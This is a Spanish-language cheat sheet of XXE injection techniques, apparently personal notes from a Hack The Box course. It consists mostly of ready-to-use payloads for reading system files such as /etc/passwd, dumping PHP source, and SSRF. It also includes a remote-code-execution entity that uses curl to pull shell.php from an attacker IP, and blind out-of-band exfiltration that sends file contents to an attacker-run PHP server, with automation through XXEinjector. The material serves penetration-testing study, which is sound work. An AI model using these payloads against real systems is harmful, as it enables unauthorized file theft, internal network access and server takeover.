### Siempre agregar las entidades luego de la declaración del XML!!!

### Idenificación

CUando encontramos alguna request que posea un xml, primero vemos si alguno de los datos de la misma se ve reflejado en la response.
Luego inyectamos en ese dato una nueva entidad:

    <!DOCTYPE "nombre" [
      <!ENTITY "variable" "dato de la entidad">
    ]>

Para llamar a la nueva entidad rellenamos el campo del xml con "&variable;" 
Si el formulario es vulnerable mostrará el dato de la entidad, de no serlo mostrará &variable;


#### Leer archivos del sistema:
        <!DOCTYPE email [
          <!ENTITY company SYSTEM "file:///etc/passwd">
        ]>

#### Leer archivos mediante un svg:

#### creamos un svg con el siguiente contenido:


        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <svg>&xxe;</svg>

##### Opción2:

        <?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
        <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

#### Obtener el código de la página php:
            <!DOCTYPE email [
          <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
        ]>



#### SSRF
podemos injectar ssrfs en el xml con el fin de alcanzar servicios internos no expuestos.

        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>

#### XInclude

De a ratos nos encontramos con sitios que al hacer una request nos piden datos que luego serán parseados en el back-
end para agrergarse a un xml. ¿Cómo las distinguimos? No sabemos, simplemente hay que probar.
Para hacer una xxe, reemplazamos el parámetro que se está enviando por:

        <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

#### RCE:
##### 1)Si el módulo de php expect está instalado y permitido podríamos usar directamente: "expect://'comando'"

##### 2)Podemos generar una injección de una shell:
###### a)creamos la shell.php
###### b)Levantamos un servidor
###### c) inyectamos el siguiente código:
        <?xml version="1.0"?>
        <!DOCTYPE email [
          <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
        ]>
        <root>
        <name></name>
        <tel></tel>
        <email>&company;</email>
        <message></message>
        </root>






### Lectura avanzada de archivos:

#### CDATA:

Nos permite engañar al backend tomando el contenido como raw:


Ejemplo no aplicable:

    <!DOCTYPE email [
      <!ENTITY begin "<![CDATA[">
      <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
      <!ENTITY end "]]>">
      <!ENTITY joined "&begin;&file;&end;">
    ]>

Desde que se prohibió el joined como medio interno, nos vemos obligado a usarlo desde afuera:

LaPorota@htb[/htb]$ 

        echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd

##### Injection
        <!DOCTYPE email [
          <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
          <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
          <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
          <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
          %xxe;
        ]>
        ...
        <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->



### ERROR BASED XXE:

Probamos romper el xml en la request para ver como lo resuelve el backend.

Si el error nos brinda información sobre directorios o subdirectorios con rutas podemos:

#### Crear un dtd:
        <!ENTITY % file SYSTEM "file:///etc/hosts">
        <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

y luego referenciarlo desde la request:

        <!DOCTYPE email [ 
          <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
          %remote;
          %error;
        ]>




### Blind xxe
#### Out-of-band Data Exfiltration

cramos un xml en nuestro servidor:

        <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
        <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

##### luego un index.php
        <?php
        if(isset($_GET['content'])){
            error_log("\n\n" . base64_decode($_GET['content']));
        }
        ?>

##### Levantamos el servidor php:
        php -S 0.0.0.0:8000

##### Inyectamos la entidad:
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE email [ 
          <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
          %remote;
          %oob;
        ]>
        <root>&content;</root>

##### Podemos automatizar el ataque con herramientas como xxeinjector:

        git clone https://github.com/enjoiz/XXEinjector.git


##### Guardamos la request http que tenemos en burp a un archivo desde el inicio hasta la declaración del xml y agregamos xxeinject ej:

    POST /blind/submitDetails.php HTTP/1.1
    Host: 10.129.201.94
    Content-Length: 169
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
    Content-Type: text/plain;charset=UTF-8
    Accept: */*
    Origin: http://10.129.201.94
    Referer: http://10.129.201.94/blind/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Connection: close
    
            <?xml version="1.0" encoding="UTF-8"?>
            XXEINJECT

##### luego corremos la herramienta con:
        ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter


